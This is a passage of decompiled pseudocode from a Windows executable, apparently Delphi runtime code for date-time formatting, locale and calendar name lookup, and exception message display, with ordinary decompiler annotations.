  char *v8; // [esp-18h] [ebp-134h]
  unsigned int v9[2]; // [esp-Ch] [ebp-128h] BYREF
  int *v10; // [esp-4h] [ebp-120h]
  CHAR DateStr[256]; // [esp+8h] [ebp-114h] BYREF
  SYSTEMTIME Date; // [esp+108h] [ebp-14h] BYREF
  char *v13; // [esp+118h] [ebp-4h] BYREF
  int savedregs; // [esp+11Ch] [ebp+0h] BYREF

  v13 = 0;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_40847E;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  sub_4034C8(a2);
  Date.wYear = *(_WORD *)(a3 - 14);
  Date.wMonth = *(_WORD *)(a3 - 16);
  Date.wDay = *(_WORD *)(a3 - 18);
  if ( a1 > 2 )
    sub_403560((volatile __int32 *)&v13, (__int32)"yyyy");
  else
    sub_403560((volatile __int32 *)&v13, (__int32)dword_408494);
  v8 = sub_4038E8(v13);
  ThreadLocale_0 = GetThreadLocale_0();
  if ( GetDateFormatA(ThreadLocale_0, 4u, &Date, v8, DateStr, 256) )
  {
    sub_4036F8(a2, DateStr, 256);
    if ( a1 == 1 && **a2 == 48 )
    {
      v6 = sub_403724((int)*a2);
      sub_40392C((int)*a2, 2, v6 - 1, a2);
    }
  }
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_408485;
  return sub_4034C8(&v13);
}
// 408494: using guessed type int dword_408494[3];

//----- (004084A8) --------------------------------------------------------
int __usercall sub_4084A8@<eax>(char *a1@<eax>, int a2)
{
  char v2; // bl
  char v3; // al
  int v4; // eax
  int v5; // eax
  char *v6; // esi
  _BYTE *v7; // esi
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned __int16 v12; // ax
  char *v13; // esi
  int v14; // eax
  int v15; // eax
  char *v16; // esi
  unsigned __int8 v17; // al
  unsigned int v19[2]; // [esp-Ch] [ebp-3Ch] BYREF
  int *v20; // [esp-4h] [ebp-34h]
  char *v21; // [esp+8h] [ebp-28h] BYREF
  char *v22; // [esp+Ch] [ebp-24h] BYREF
  char v23; // [esp+11h] [ebp-1Fh]
  char v24; // [esp+12h] [ebp-1Eh]
  char v25; // [esp+13h] [ebp-1Dh]
  unsigned __int16 v26; // [esp+14h] [ebp-1Ch]
  unsigned __int16 v27; // [esp+16h] [ebp-1Ah]
  unsigned __int16 v28; // [esp+18h] [ebp-18h]
  unsigned __int16 v29; // [esp+1Ah] [ebp-16h]
  char v30; // [esp+1Dh] [ebp-13h]
  unsigned __int16 v31; // [esp+1Eh] [ebp-12h]
  unsigned __int16 v32; // [esp+20h] [ebp-10h]
  unsigned __int16 v33; // [esp+22h] [ebp-Eh]
  int v34; // [esp+24h] [ebp-Ch]
  char v35; // [esp+2Bh] [ebp-5h] BYREF
  char *v36; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v21 = 0;
  v22 = 0;
  v36 = a1;
  v20 = &savedregs;
  v19[1] = (unsigned int)&loc_408BE9;
  v19[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v19);
  if ( a1 && *(int *)(a2 - 264) < 2 )
  {
    ++*(_DWORD *)(a2 - 264);
    v2 = 32;
    v30 = 0;
    v25 = 0;
    v24 = 0;
    while ( 1 )
    {
      while ( 1 )
      {
LABEL_108:
        v17 = *v36;
        if ( !*v36 )
        {
LABEL_109:
          --*(_DWORD *)(a2 - 264);
          goto LABEL_110;
        }
        v35 = *v36++;
        if ( !_bittest(dword_41C104, v17) )
          break;
        if ( !*v36 )
          goto LABEL_109;
        ++v36;
        v2 = 32;
      }
      v3 = v35;
      if ( (unsigned __int8)(v35 - 97) < 0x1Au )
        v3 = v35 - 32;
      if ( (unsigned __int8)(v3 - 65) < 0x1Au )
      {
        if ( v3 == 77 && v2 == 72 )
          v3 = 78;
        v2 = v3;
      }
      switch ( v3 )
      {
        case '"':
        case '\'':
          v16 = v36;
          while ( *v36 )
          {
            if ( *v36 == v35 )
              break;
            if ( _bittest(dword_41C104, (unsigned __int8)*v36) )
            {
              if ( !*++v36 )
                break;
            }
            ++v36;
          }
          sub_4080E0(v16, v36 - v16, a2);
          if ( *v36 )
            ++v36;
          goto LABEL_108;
        case '/':
          sub_4080E0(&byte_41E4F1, 1, a2);
          goto LABEL_108;
        case ':':
          sub_4080E0(&byte_41E4FC, 1, a2);
          goto LABEL_108;
        case 'A':
          sub_4081F4((int)&savedregs);
          v13 = v36 - 1;
          if ( sub_4075E0(v36 - 1, "AM/PM", 5) )
          {
            if ( sub_4075E0(v13, "A/P", 3) )
            {
              if ( sub_4075E0(v13, "AMPM", 4) )
              {
                if ( sub_4075E0(v13, "AAAA", 4) )
                {
                  if ( sub_4075E0(v13, &off_408C14, 3) )
                    goto LABEL_107;
                  sub_4081BC((int)&savedregs);
                  v15 = sub_408068(*(double *)(a2 + 8));
                  sub_408124((char *)dword_41E56C[v15], a2);
                  v36 += 2;
                }
                else
                {
                  sub_4081BC((int)&savedregs);
                  v14 = sub_408068(*(double *)(a2 + 8));
                  sub_408124((char *)dword_41E588[v14], a2);
                  v36 += 3;
                }
              }
              else
              {
                if ( v29 >= 0xCu )
                  sub_408124((char *)dword_41E504, a2);
                else
                  sub_408124((char *)dword_41E500, a2);
                v36 += 3;
                v24 = 1;
              }
            }
            else
            {
              if ( v29 >= 0xCu )
                v13 += 2;
              sub_4080E0(v13, 1, a2);
              v36 += 2;
              v24 = 1;
            }
          }
          else
          {
            if ( v29 >= 0xCu )
              v13 += 3;
            sub_4080E0(v13, 2, a2);
            v36 += 4;
            v24 = 1;
          }
          goto LABEL_108;
        case 'C':
          sub_408190((int)&savedregs);
          sub_4084A8((char *)dword_41E4F4, a2);
          sub_4081F4((int)&savedregs);
          if ( v29 || v28 || v27 )
          {
            sub_4080E0((char *)&dword_408C18, 1, a2);
            sub_4084A8((char *)dword_41E50C[0], a2);
          }
          goto LABEL_108;
        case 'D':
          sub_408190((int)&savedregs);
          if ( (unsigned int)(v34 - 1) < 2 )
          {
            sub_4081BC((int)&savedregs);
            sub_408144(v31, v34, a2);
          }
          else
          {
            switch ( v34 )
            {
              case 3:
                v4 = sub_408068(*(double *)(a2 + 8));
                sub_408124((char *)dword_41E56C[v4], a2);
                break;
              case 4:
                v5 = sub_408068(*(double *)(a2 + 8));
                sub_408124((char *)dword_41E588[v5], a2);
                break;
              case 5:
                sub_4084A8((char *)dword_41E4F4, a2);
                break;
              default:
                sub_4084A8((char *)dword_41E4F8, a2);
                break;
            }
          }
          goto LABEL_108;
        case 'E':
          sub_408190((int)&savedregs);
          sub_4081BC((int)&savedregs);
          sub_4083A0(v34, &v21, (int)&savedregs);
          sub_408124(v21, a2);
          goto LABEL_108;
        case 'G':
          sub_408190((int)&savedregs);
          sub_4081BC((int)&savedregs);
          sub_408234(v34, &v22, (int)&savedregs);
          sub_408124(v22, a2);
          goto LABEL_108;
        case 'H':
          sub_408190((int)&savedregs);
          sub_4081F4((int)&savedregs);
          v23 = 0;
          v6 = v36;
          break;
        case 'M':
          sub_408190((int)&savedregs);
          sub_4081BC((int)&savedregs);
          if ( (unsigned int)(v34 - 1) < 2 )
          {
            sub_408144(v32, v34, a2);
          }
          else if ( v34 == 3 )
          {
            sub_408124((char *)dword_41E50C[v32], a2);
          }
          else
          {
            sub_408124((char *)dword_41E53C[v32], a2);
          }
          goto LABEL_108;
        case 'N':
          sub_408190((int)&savedregs);
          sub_4081F4((int)&savedregs);
          if ( v34 > 2 )
            v34 = 2;
          sub_408144(v28, v34, a2);
          goto LABEL_108;
        case 'S':
          sub_408190((int)&savedregs);
          sub_4081F4((int)&savedregs);
          if ( v34 > 2 )
            v34 = 2;
          sub_408144(v27, v34, a2);
          goto LABEL_108;
        case 'T':
          sub_408190((int)&savedregs);
          if ( v34 == 1 )
            sub_4084A8((char *)dword_41E508, a2);
          else
            sub_4084A8((char *)dword_41E50C[0], a2);
          goto LABEL_108;
        case 'Y':
          sub_408190((int)&savedregs);
          sub_4081BC((int)&savedregs);
          if ( v34 > 2 )
            sub_408144(v33, 4, a2);
          else
            sub_408144(v33 % 0x64u, 2, a2);
          goto LABEL_108;
        case 'Z':
          sub_408190((int)&savedregs);
          sub_4081F4((int)&savedregs);
          if ( v34 > 3 )
            v34 = 3;
          sub_408144(v26, v34, a2);
          goto LABEL_108;
        default:
LABEL_107:
          sub_4080E0(&v35, 1, a2);
          goto LABEL_108;
      }
      while ( *v6 )
      {
        if ( _bittest(dword_41C104, (unsigned __int8)*v6) )
        {
          v7 = v6 + 1;
          if ( !*v7 )
            break;
          v6 = v7 + 1;
        }
        else
        {
          v8 = (unsigned __int8)*v6;
          if ( v8 > 0x48 )
          {
            v11 = v8 - 97;
            if ( v11 )
            {
              if ( v11 == 7 )
                break;
              goto LABEL_53;
            }
LABEL_47:
            if ( !v23 )
            {
              if ( !sub_4075E0(v6, "AM/PM", 5) || !sub_4075E0(v6, "A/P", 3) || !sub_4075E0(v6, "AMPM", 4) )
                v24 = 1;
              break;
            }
            goto LABEL_53;
          }
          if ( v8 == 72 )
            break;
          v9 = v8 - 34;
          if ( !v9 || (v10 = v9 - 5) == 0 )
          {
            v23 ^= 1u;
            goto LABEL_53;
          }
          if ( v10 == 26 )
            goto LABEL_47;
LABEL_53:
          ++v6;
        }
      }
      v12 = v29;
      if ( v24 )
      {
        if ( v29 )
        {
          if ( v29 > 0xCu )
            v12 = v29 - 12;
        }
        else
        {
          v12 = 12;
        }
      }
      if ( v34 > 2 )
        v34 = 2;
      sub_408144(v12, v34, a2);
    }
  }
LABEL_110:
  __writefsdword(0, v19[0]);
  v20 = (int *)&loc_408BF0;
  return sub_4034EC((int)&v21, 2);
}
// 408C14: using guessed type void *off_408C14;
// 408C18: using guessed type int dword_408C18;
// 41C104: using guessed type signed __int32 dword_41C104[8];
// 41E4F1: using guessed type char byte_41E4F1;
// 41E4F4: using guessed type int dword_41E4F4;
// 41E4F8: using guessed type int dword_41E4F8;
// 41E4FC: using guessed type char byte_41E4FC;
// 41E500: using guessed type int dword_41E500;
// 41E504: using guessed type int dword_41E504;
// 41E508: using guessed type int dword_41E508;
// 41E50C: using guessed type int dword_41E50C[];
// 41E53C: using guessed type int dword_41E53C[];
// 41E56C: using guessed type int dword_41E56C[];
// 41E588: using guessed type int dword_41E588[];

//----- (00408C1C) --------------------------------------------------------
_DWORD *__userpurge sub_408C1C@<eax>(char **a1@<eax>, char *a2@<edx>, int a3, int a4)
{
  char v6[256]; // [esp+10h] [ebp-100h] BYREF
  int savedregs; // [esp+110h] [ebp+0h] BYREF

  if ( a2 )
    sub_4084A8(a2, (int)&savedregs);
  else
    sub_4084A8((char *)&dword_408C74, (int)&savedregs);
  return sub_4035B0(a1, v6, 0);
}
// 408C74: using guessed type int dword_408C74;
// 408C1C: using guessed type char var_100[256];

//----- (00408C78) --------------------------------------------------------
_DWORD *__userpurge sub_408C78@<eax>(char **a1@<eax>, int a2, int a3)
{
  return sub_408C1C(a1, 0, a2, a3);
}

//----- (00408C8C) --------------------------------------------------------
_DWORD *__userpurge sub_408C8C@<eax>(char *a1@<eax>, char **a2@<edx>, int a3, int a4)
{
  return sub_408C1C(a2, a1, a3, a4);
}

//----- (00408CA0) --------------------------------------------------------
_DWORD *__usercall sub_408CA0@<eax>(DWORD a1@<eax>, char **a2@<edx>)
{
  int i; // eax
  CHAR v4; // dl
  bool v5; // cf
  char v6; // dl
  CHAR Buffer[260]; // [esp+2h] [ebp-104h] BYREF

  for ( i = FormatMessageA(0x3000u, 0, a1, 0, Buffer, 0x100u, 0); i > 0; --i )
  {
    v4 = Buffer[i - 1];
    v5 = (unsigned __int8)v4 < 0x21u;
    v6 = v4 - 33;
    if ( !v5 && v6 != 13 )
      break;
  }
  return sub_4035B0(a2, Buffer, i);
}

//----- (00408CEC) --------------------------------------------------------
volatile __int32 *__userpurge sub_408CEC@<eax>(LCID a1@<eax>, LCTYPE a2@<edx>, __int32 a3@<ecx>, volatile __int32 *a4)
{
  int LocaleInfoA_0; // eax
  CHAR LCData[256]; // [esp+8h] [ebp-100h] BYREF

  LocaleInfoA_0 = GetLocaleInfoA_0(a1, a2, LCData, 256);
  if ( LocaleInfoA_0 <= 0 )
    return sub_40351C(a4, a3);
  else
    return sub_4035B0((char **)a4, LCData, LocaleInfoA_0 - 1);
}

//----- (00408D38) --------------------------------------------------------
int __usercall sub_408D38@<eax>(LCID a1@<eax>, LCTYPE a2@<edx>, int a3@<ecx>)
{
  int result; // eax
  int LCData[4]; // [esp+0h] [ebp-10h] BYREF

  LCData[0] = a3;
  result = GetLocaleInfoA_0(a1, a2, (LPSTR)LCData, 2);
  if ( result <= 0 )
    return a3;
  LOBYTE(result) = LCData[0];
  return result;
}
// 408D38: using guessed type int LCData[4];

//----- (00408D60) --------------------------------------------------------
int **__userpurge sub_408D60@<eax>(LCTYPE a1@<eax>, int a2@<edx>, int a3@<ecx>, volatile __int32 *a4, int a5, int a6)
{
  int **result; // eax

  result = (int **)sub_408CEC(*(_DWORD *)(a6 - 4), a1, 0, a4);
  if ( !*a4 )
    return sub_404B80(*(int ***)(a3 + 4 * a2), (char **)a4);
  return result;
}

//----- (00408D9C) --------------------------------------------------------
int __usercall sub_408D9C@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // ebx
  volatile __int32 *v4; // esi
  volatile __int32 *v5; // edi
  int v6; // ebx
  volatile __int32 *v7; // esi
  volatile __int32 *v8; // edi
  unsigned int v10[2]; // [esp-18h] [ebp-30h] BYREF
  int *v11; // [esp-10h] [ebp-28h]
  int v12; // [esp-Ch] [ebp-24h]
  int v13; // [esp-8h] [ebp-20h]
  int v14; // [esp-4h] [ebp-1Ch]
  __int32 v15; // [esp+0h] [ebp-18h] BYREF
  __int32 v16; // [esp+4h] [ebp-14h] BYREF
  __int32 v17; // [esp+8h] [ebp-10h] BYREF
  __int32 v18; // [esp+Ch] [ebp-Ch] BYREF
  int v19; // [esp+10h] [ebp-8h]
  LCID ThreadLocale_0; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  ThreadLocale_0 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = a1;
  v13 = a3;
  v12 = a2;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_408EAF;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  ThreadLocale_0 = GetThreadLocale_0();
  v3 = 1;
  v4 = dword_41E510;
  v5 = dword_41E540;
  do
  {
    sub_408D60(v3 + 67, v3 - 1, (int)off_41C160, &v18, 11, (int)&savedregs);
    sub_40351C(v4, v18);
    sub_408D60(v3 + 55, v3 - 1, (int)off_41C190, &v17, 11, (int)&savedregs);
    sub_40351C(v5, v17);
    ++v3;
    ++v5;
    ++v4;
  }
  while ( v3 != 13 );
  v6 = 1;
  v7 = dword_41E570;
  v8 = dword_41E58C;
  do
  {
    v19 = (v6 + 5) % 7;
    sub_408D60(v19 + 49, v6 - 1, (int)off_41C1C0, &v16, 6, (int)&savedregs);
    sub_40351C(v7, v16);
    sub_408D60(v19 + 42, v6 - 1, (int)off_41C1DC, &v15, 6, (int)&savedregs);
    sub_40351C(v8, v15);
    ++v6;
    ++v8;
    ++v7;
  }
  while ( v6 != 8 );
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_408EB6;
  return sub_4034EC((int)&v15, 4);
}
// 408D9C: could not find valid save-restore pair for ebx
// 408D9C: could not find valid save-restore pair for edi
// 408D9C: could not find valid save-restore pair for esi
// 41C160: using guessed type int **off_41C160[38];
// 41C190: using guessed type int **off_41C190[26];
// 41C1C0: using guessed type int **off_41C1C0[14];
// 41C1DC: using guessed type int **off_41C1DC[7];
// 41E510: using guessed type int dword_41E510[11];
// 41E540: using guessed type int dword_41E540[11];
// 41E570: using guessed type int dword_41E570[6];
// 41E58C: using guessed type int dword_41E58C[7];

//----- (00408EC0) --------------------------------------------------------
BOOL __stdcall CalInfoEnumProc(LPSTR a1)
{
  int v1; // esi
  int i; // ebx

  v1 = 0;
  for ( i = 1; dword_41E5B0[i]; ++i )
  {
    if ( i == 7 )
      return v1;
  }
  sub_403680((char **)&dword_41E5B0[i], a1);
  return 1;
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00408EFC) --------------------------------------------------------
BOOL __stdcall sub_408EFC(LPSTR a1)
{
  int v1; // esi
  int i; // ebx
  char *v3; // ecx
  unsigned int v5[2]; // [esp-14h] [ebp-18h] BYREF
  int *v6; // [esp-Ch] [ebp-10h]
  char *v7; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_408F61;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = 0;
  for ( i = 1; dword_41E5CC[i] != -1; ++i )
  {
    if ( i == 7 )
      goto LABEL_6;
  }
  sub_403680(&v7, a1);
  dword_41E5CC[i] = sub_407058((int)v7, 0, v3);
  v1 = 1;
LABEL_6:
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_408F68;
  sub_4034C8(&v7);
  return v1;
}
// 408F3A: variable 'v3' is possibly undefined
// 41E5CC: using guessed type int dword_41E5CC[];

//----- (00408F74) --------------------------------------------------------
_DWORD *sub_408F74()
{
  LCID ThreadLocale_0; // eax
  char *v1; // ecx
  int v2; // esi
  LCID v3; // eax
  int v4; // edx
  _DWORD *v5; // eax
  LCID v6; // eax
  unsigned int v8[2]; // [esp-10h] [ebp-14h] BYREF
  int *v9; // [esp-8h] [ebp-Ch]
  __int32 v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_40900B;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  ThreadLocale_0 = GetThreadLocale_0();
  sub_408CEC(ThreadLocale_0, 0x100Bu, (__int32)&dword_409020, &v10);
  v2 = sub_407058(v10, 1, v1);
  if ( (unsigned int)(v2 - 3) < 3 )
  {
    v3 = GetThreadLocale_0();
    EnumCalendarInfoA(CalInfoEnumProc, v3, v2, 4u);
    v4 = 7;
    v5 = &unk_41E5D0;
    do
    {
      *v5++ = -1;
      --v4;
    }
    while ( v4 );
    v6 = GetThreadLocale_0();
    EnumCalendarInfoA(sub_408EFC, v6, v2, 3u);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_409012;
  return sub_4034C8(&v10);
}
// 408FA8: variable 'v1' is possibly undefined
// 409020: using guessed type int dword_409020;

//----- (00409024) --------------------------------------------------------
int __usercall sub_409024@<eax>(int a1@<eax>, char **a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v7; // ebx
  LCID ThreadLocale_0; // eax
  char *v9; // ecx
  unsigned int v12[2]; // [esp-18h] [ebp-28h] BYREF
  int *v13; // [esp-10h] [ebp-20h]
  int v14; // [esp-Ch] [ebp-1Ch]
  int v15; // [esp-8h] [ebp-18h]
  int v16; // [esp-4h] [ebp-14h]
  char *v17; // [esp+0h] [ebp-10h] BYREF
  char *v18; // [esp+4h] [ebp-Ch] BYREF
  char *v19; // [esp+8h] [ebp-8h] BYREF
  __int32 v20; // [esp+Ch] [ebp-4h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v20 = 0;
  v19 = 0;
  v18 = 0;
  v17 = 0;
  v16 = a3;
  v15 = a5;
  v14 = a4;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_4091E6;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v7 = 1;
  sub_4034C8(a2);
  ThreadLocale_0 = GetThreadLocale_0();
  sub_408CEC(ThreadLocale_0, 0x1009u, (__int32)&dword_4091FC, &v20);
  if ( (unsigned int)(sub_407058(v20, 1, v9) - 3) < 3 )
  {
    while ( v7 <= sub_403724(a1) )
    {
      if ( _bittest(dword_41C104, *(unsigned __int8 *)(a1 + v7 - 1)) )
      {
        sub_40392C(a1, v7, 2, &v18);
        sub_40372C(a2, (__int32)v18);
        v7 += 2;
      }
      else
      {
        if ( sub_4075E0((_BYTE *)(a1 + v7 - 1), dword_409200, 2) )
        {
          if ( sub_4075E0((_BYTE *)(a1 + v7 - 1), "yyyy", 4) )
          {
            if ( sub_4075E0((_BYTE *)(a1 + v7 - 1), "yy", 2) )
            {
              if ( *(_BYTE *)(a1 + v7 - 1) == 89 || *(_BYTE *)(a1 + v7 - 1) == 121 )
              {
                sub_40372C(a2, (__int32)&dword_409240);
              }
              else
              {
                sub_403670(&v17);
                sub_40372C(a2, (__int32)v17);
              }
            }
            else
            {
              sub_40372C(a2, (__int32)dword_409234);
              ++v7;
            }
          }
          else
          {
            sub_40372C(a2, (__int32)"eeee");
            v7 += 3;
          }
        }
        else
        {
          sub_40372C(a2, (__int32)&dword_40920C);
          ++v7;
        }
        ++v7;
      }
    }
  }
  else if ( word_41E5AC == 4 || (unsigned __int16)(word_41E5AC - 17) < 2u )
  {
    while ( v7 <= sub_403724(a1) )
    {
      if ( *(_BYTE *)(a1 + v7 - 1) != 71 && *(_BYTE *)(a1 + v7 - 1) != 103 )
      {
        sub_403670(&v19);
        sub_40372C(a2, (__int32)v19);
      }
      ++v7;
    }
  }
  else
  {
    sub_40351C((volatile __int32 *)a2, a1);
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_4091ED;
  return sub_4034EC((int)&v17, 4);
}
// 409024: could not find valid save-restore pair for ebx
// 409024: could not find valid save-restore pair for edi
// 409024: could not find valid save-restore pair for esi
// 40906E: variable 'v9' is possibly undefined
// 4091FC: using guessed type int dword_4091FC;
// 409200: using guessed type int dword_409200[3];
// 40920C: using guessed type int dword_40920C;
// 409234: using guessed type int dword_409234[3];
// 409240: using guessed type int dword_409240;
// 41C104: using guessed type signed __int32 dword_41C104[8];
// 41E5AC: using guessed type __int16 word_41E5AC;

//----- (00409244) --------------------------------------------------------
int __usercall sub_409244@<eax>(int result@<eax>)
{
  if ( result )
    result -= 4096;
  return result;
}

//----- (00409250) --------------------------------------------------------
unsigned int __userpurge sub_409250@<eax>(int a1@<eax>, const void *a2@<edx>, const char *a3@<ecx>, unsigned int a4)
{
  _BYTE *v6; // eax
  char *v7; // ebx
  int *v8; // edi
  unsigned int v9; // eax
  HINSTANCE v10; // eax
  int *v12; // [esp-Ch] [ebp-470h]
  char v13[256]; // [esp+Ch] [ebp-458h] BYREF
  char *v14; // [esp+10Ch] [ebp-358h] BYREF
  char v15; // [esp+110h] [ebp-354h]
  char *v16; // [esp+114h] [ebp-350h]
  char v17; // [esp+118h] [ebp-34Ch]
  int v18; // [esp+11Ch] [ebp-348h]
  char v19; // [esp+120h] [ebp-344h]
  char *v20; // [esp+124h] [ebp-340h]
  char v21; // [esp+128h] [ebp-33Ch]
  int *v22; // [esp+12Ch] [ebp-338h]
  char v23; // [esp+130h] [ebp-334h]
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+134h] [ebp-330h] BYREF
  CHAR v25[256]; // [esp+152h] [ebp-312h] BYREF
  CHAR Filename[261]; // [esp+252h] [ebp-212h] BYREF
  char v27[261]; // [esp+357h] [ebp-10Dh] BYREF
  int v28; // [esp+45Ch] [ebp-8h]
  unsigned __int8 *v29; // [esp+460h] [ebp-4h]

  v29 = (unsigned __int8 *)a3;
  VirtualQuery_0(a2, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 && GetModuleFileNameA_1((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v28 = (_BYTE *)a2 - (_BYTE *)Buffer.AllocationBase;
  }
  else
  {
    GetModuleFileNameA_1(hInst, Filename, 0x105u);
    v28 = sub_409244((int)a2);
  }
  v6 = sub_409F00((unsigned __int8 *)Filename, 0x5Cu);
  sub_407588(v27, v6 + 1, 260);
  v7 = (char *)&dword_4093D0;
  v8 = &dword_4093D0;
  if ( sub_402C40((int *)a1, (int)dword_406240) )
  {
    v7 = sub_4038E8(*(char **)(a1 + 4));
    v9 = sub_407534(v7);
    if ( v9 )
    {
      if ( v7[v9 - 1] != 46 )
        v8 = &dword_4093D4;
    }
  }
  v12 = off_41DC78[0][1];
  v10 = (HINSTANCE)sub_404638((int)hInst);
  LoadStringA_0(v10, (UINT)v12, v25, 256);
  sub_402B5C(*(_DWORD *)a1, v13);
  v14 = v13;
  v15 = 4;
  v16 = v27;
  v17 = 6;
  v18 = v28;
  v19 = 5;
  v20 = v7;
  v21 = 6;
  v22 = v8;
  v23 = 6;
  sub_407AF8(v29, a4, v25, 4, (int)&v14);
  return sub_407534((const char *)v29);
}
// 406240: using guessed type int dword_406240[2];
// 4093D0: using guessed type int dword_4093D0;
// 4093D4: using guessed type int dword_4093D4;
// 41DC78: using guessed type int **off_41DC78[3];

//----- (004093D8) --------------------------------------------------------
void __usercall sub_4093D8(int a1@<eax>, const void *a2@<edx>)
{
  _DWORD *v2; // eax
  HINSTANCE v3; // eax
  UINT v4; // [esp-Ch] [ebp-44Ch]
  CHAR Buffer[64]; // [esp+0h] [ebp-440h] BYREF
  CHAR Text[1024]; // [esp+40h] [ebp-400h] BYREF

  sub_409250(a1, a2, Text, 0x400u);
  if ( *off_41DC18 )
  {
    v2 = sub_40528C(off_41DB30, Text);
    sub_40520F(v2);
    sub_40265C();
  }
  else
  {
    v4 = off_41DB0C[0][1];
    v3 = (HINSTANCE)sub_404638((int)hInst);
    LoadStringA_0(v3, v4, Buffer, 64);
    MessageBoxA_0(0, Text, Buffer, 0x2010u);
  }
}
// 41DB0C: using guessed type int *off_41DB0C[9];
// 41DB30: using guessed type int (*off_41DB30)[115];
// 41DC18: using guessed type char *off_41DC18;

//----- (00409450) --------------------------------------------------------
_DWORD *__usercall sub_409450@<eax>(int a1@<eax>, char a2@<dl>, __int32 a3@<ecx>)
{
  char v3; // bl
  _DWORD *v4; // edi

  if ( a2 )
    a1 = sub_402CDC(a1, a2);
  v3 = a2;
  v4 = (_DWORD *)a1;
  sub_40351C((volatile __int32 *)(a1 + 4), a3);
  if ( v3 )
    sub_402D34(v4);
  return v4;
}
// 409461: variable 'a2' is possibly undefined
// 40946A: variable 'a3' is possibly undefined

//----- (0040948C) --------------------------------------------------------
int __userpurge sub_40948C@<eax>(int a1@<eax>, char a2@<dl>, unsigned __int8 *ecx0@<ecx>, int a4, int a5)
{
  char v5; // bl
  int v6; // edi
  unsigned int v8[2]; // [esp-28h] [ebp-2Ch] BYREF
  int *v9; // [esp-20h] [ebp-24h]
  char *v10; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v10 = 0;
  if ( a2 )
    a1 = sub_402CDC(a1, a2);
  v5 = a2;
  v6 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4094E6;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_407B2C(ecx0, a5, a4, &v10);
  sub_40351C((volatile __int32 *)(v6 + 4), (__int32)v10);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_4094ED;
  sub_4034C8(&v10);
  if ( v5 )
    sub_402D34((_DWORD *)v6);
  return v6;
}
// 4094A2: variable 'a2' is possibly undefined
// 4094C0: variable 'ecx0' is possibly undefined

//----- (0040950C) --------------------------------------------------------
_DWORD *__usercall sub_40950C@<eax>(int a1@<eax>, char a2@<dl>, int **a3@<ecx>)
{
  char v3; // bl
  _DWORD *v4; // edi

  if ( a2 )
    a1 = sub_402CDC(a1, a2);
  v3 = a2;
  v4 = (_DWORD *)a1;
  sub_404B80(a3, (char **)(a1 + 4));
  if ( v3 )
    sub_402D34(v4);
  return v4;
}
// 40951D: variable 'a2' is possibly undefined
// 409526: variable 'a3' is possibly undefined

//----- (00409548) --------------------------------------------------------
int __userpurge sub_409548@<eax>(int a1@<eax>, char a2@<dl>, int **a3@<ecx>, int a4, int a5)
{
  char v5; // bl
  int v6; // edi
  unsigned int v8[2]; // [esp-28h] [ebp-30h] BYREF
  int *v9; // [esp-20h] [ebp-28h]
  char *v10; // [esp+0h] [ebp-8h] BYREF
  char *v11; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  if ( a2 )
    a1 = sub_402CDC(a1, a2);
  v5 = a2;
  v6 = a1;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_4095B4;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_404B80(a3, &v10);
  sub_407B2C((unsigned __int8 *)v10, a5, a4, &v11);
  sub_40351C((volatile __int32 *)(v6 + 4), (__int32)v11);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_4095BB;
  sub_4034EC((int)&v10, 2);
  if ( v5 )
    sub_402D34((_DWORD *)v6);
  return v6;
}
// 409560: variable 'a2' is possibly undefined
// 40957B: variable 'a3' is possibly undefined

//----- (004095DC) --------------------------------------------------------
int __usercall sub_4095DC@<eax>(int result@<eax>)
{
  if ( *(_BYTE *)(result + 12) )
    return sub_402B84((int *)result);
  return result;
}

//----- (00409608) --------------------------------------------------------
_DWORD *sub_409608()
{
  int v0; // ebx
  int v1; // eax
  int v2; // esi
  _DWORD *result; // eax
